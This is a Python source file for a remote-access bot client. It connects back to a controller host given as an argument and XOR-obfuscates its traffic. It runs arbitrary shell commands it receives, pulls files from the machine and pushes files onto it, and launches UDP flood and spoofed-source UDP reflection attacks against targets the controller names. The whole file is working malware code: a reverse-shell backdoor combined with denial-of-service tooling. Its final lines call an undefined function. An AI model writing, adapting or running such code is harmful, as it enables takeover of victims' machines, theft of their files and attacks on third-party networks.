#!/usr/bin/python
# -*- coding: <UTF-8> -*-

from socket import socket, IPPROTO_UDP, IPPROTO_RAW , SOCK_DGRAM, SOCK_STREAM, SOCK_RAW, AF_INET
from subprocess import Popen, PIPE
from sys import exit as sysexit, argv
from time import sleep
from multiprocessing import Process
from pinject import UDP, IP
from multiprocessing import Process, freeze_support
#https://docs.python.org/2/library/multiprocessing.html#multiprocessing.freeze_support

def make_en_STDOUT(STDOUT,sock):
	en_STDOUT = bytearray(STDOUT,'UTF-8')
	for i in range(len(en_STDOUT)):
		en_STDOUT[i] ^=0x41
	try:
		sock.send(en_STDOUT)
	except:
		sock.close()
		return 1
	return 0

def make_en_bin_STDOUT(STDOUT):
	if STDOUT:
		en_STDOUT = bytearray(STDOUT)
	else:
		en_STDOUT = bytearray("Command not recognised",'UTF-8')
	for i in range(len(en_STDOUT)):
		en_STDOUT[i] ^=0x41
	return en_STDOUT

def make_en_data(data):
	en_data = bytearray(data)
	for i in range(len(en_data)):
		en_data[i]  ^=0x41
	return en_data.decode('UTF-8')

def make_en_bin_data(data):
	en_data = bytearray(data)
	for i in range(len(en_data)):
		en_data[i] ^=0x41
	return en_data

def get_en_data(sock, size):
	data = sock.recv(size)
	return make_en_data(data)

def UDP_Flood(target_IP, target_Port,msg):
	flood_sock = socket(AF_INET, SOCK_DGRAM)
	while True:
		flood_sock.sendto(bytes(msg), (target_IP,target_Port))
		sleep(0.01)

def UDP_Spoof(DEST_IP,DEST_PORT,SOURCE_IP,SOURCE_PORT,PAYLOAD):
	UDP_HEADER = UDP(SOURCE_PORT,DEST_PORT,PAYLOAD).pack(SOURCE_IP,DEST_IP)
	IP_HEADER = IP(SOURCE_IP,DEST_IP,UDP_HEADER,IPPROTO_UDP).pack()
	return IP_HEADER+UDP_HEADER+PAYLOAD

def UDP_Spoof_Send(TARGET_IP,TARGET_PORT,SPOOFED_IP,SPOOFED_PORT,PAYLOAD):
	spoofed_packet = UDP_Spoof(TARGET_IP,TARGET_PORT,SPOOFED_IP,SPOOFED_PORT,PAYLOAD)
	sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)
	while True:
		sock.sendto(spoofed_packet, (TARGET_IP,TARGET_PORT))
		sleep(0.01)

def main():
	try:
		RHOST = argv[1]
		RPORT = 9000
	except:
		print ("Must provide hotst")
		sysexit()
	s = socket(AF_INET, SOCK_STREAM)
	s.connect((RHOST,RPORT))

	while True:
		en_data = get_en_data(s,2048)
		if en_data == 'killMe':
			break
		elif en_data == 'getFile':
			en_data = get_en_data(s,2048)
			try:
				fileToWrite = open(en_data,'w')
				STDOUT = 'fcs'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			fSize = get_en_data(s,1024)
			en_data = get_en_data(s,int(fSize))
			fileToWrite.write(en_data)
			fileToWrite.close()
			STDOUT = "fsw"
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "getBinary":
			en_data = get_en_data(s,1024)
			try:
				binToWrite = open(en_data,'wb')
				STDOUT = 'fcs'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			bSize = get_en_data(s,1024)
			data = s.recv(int(bSize))
			en_data = make_en_bin_data(data)
			binToWrite.write(en_data)
			binToWrite.close()
			STDOUT = "fsw"
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "sendFile":
			en_data = get_en_data(s,1024)
			try:
				fileToSend = open(en_data,'r')
				STDOUT = 'fos'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			fileCont = fileToSend.read()
			sleep(0.1)
			STDOUT = str(len(fileCont) + 1024)
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			sleep(0.1)
			STDOUT = fileCont
			fileToSend.close()
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "sendBinary":
			en_data = get_en_data(s,1024)
			try:
				binToSend = open(en_data,'rb')
				STDOUT = 'fos'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			binCont = binToSend.read()
			binToSend.close()
			STDOUT = str(len(binCont) + 1024)
			sleep(0.1)
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			sleep(0.1)
			STDOUT = binCont
			en_STDOUT = make_en_bin_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
				s.close()
				sysexit()
		elif en_data == "udpFlood":
			#Get Target's IP and Port
			en_data = get_en_data(s,1024)
			en_data = en_data.split(":")
			targetIP = en_data[0]
			targetPort = int(en_data[1])
			#Get Payload
			en_data = get_en_data(s,1024)
			p = Process(target=UDP_Flood, args=(targetIP,targetPort,en_data))
			p.start()
			while True:
				en_data = get_en_data(s,1024)
				if en_data == "KILL":
					p.terminate()
					break
		elif en_data == "udpSpoof":
			#Get Reflector's IP and Port
			en_data = get_en_data(s,1024)
			en_data = en_data.split(":")
			targetIP = en_data[0]
			targetPort = int(en_data[1])
			#Get Target's IP and Port
			en_data = get_en_data(s,1024)
			en_data = en_data.split(":")
			spoofedIP = en_data[0]
			spoofedPort = int(en_data[1])
			#Get size of Payload
			en_data = get_en_data(s,1024)
			payloadSize = int(en_data)
			#Get Payload
			en_data = get_en_data(s,payloadSize)
			payload = en_data.encode('UTF-8')
			#Start UDP Spoof Attack
			p = Process(target=UDP_Spoof_Send, args=(targetIP,targetPort,spoofedIP,spoofedPort,payload))
			p.start()
			while True:
				en_data = get_en_data(s,1024)
				if en_data == "KILL":
					p.terminate()
					break
		else:
			comm = Popen(en_data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
			STDOUT,STDERR = comm.communicate()
			if STDERR:
				en_STDOUT = make_en_STDOUT(STDERR.decode('UTF-8'),s)
			elif STDOUT:
				en_STDOUT = make_en_STDOUT(STDOUT.decode('UTF-8'),s)
			else:
				en_STDOUT = make_en_STDOUT('Command has no output',s)
			if en_STDOUT == 1:
				sysexit()
	s.close()

#Start Here!
if __name__ == '__main__':
    freeze_support()
    Process(target=start).start()
